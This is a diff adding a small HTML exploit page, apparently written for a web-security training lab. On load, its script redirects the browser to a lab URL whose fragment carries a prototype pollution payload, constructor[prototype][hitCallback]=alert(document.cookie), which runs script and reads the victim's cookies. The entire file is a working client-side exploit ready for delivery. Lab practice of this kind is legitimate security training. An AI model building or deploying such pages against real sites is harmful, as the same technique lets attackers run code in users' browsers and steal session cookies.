@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+    <script>
+        // Redirect to the vulnerable page with prototype pollution payload that alerts document.cookie
+        window.location.href = "https://0a2500230403d8008080033a00d700e8.web-security-academy.net/filter?category=Accessories#cat=13372&category=Accessories&constructor[prototype][hitCallback]=alert(document.cookie)";
+    </script>
+</body>
+</html>
